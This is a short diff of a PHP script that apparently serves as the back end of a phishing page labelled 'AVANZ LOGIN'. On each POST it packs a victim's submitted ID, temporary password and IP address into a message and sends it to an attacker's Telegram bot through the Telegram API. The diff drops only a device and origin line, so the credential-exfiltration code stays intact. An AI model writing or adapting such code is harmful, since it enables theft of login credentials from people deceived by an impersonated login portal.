@@ -316,7 +316,6 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $mensaje = "📥 AVANZ LOGIN\n";
     $mensaje .= "ID: $pp1\n";
     $mensaje .= "Clave temporal: $pp2\n";
-    $mensaje .= "Modo: $dispositivo ($origin)\n";
     $mensaje .= "Red: $ip";
 
     file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query([
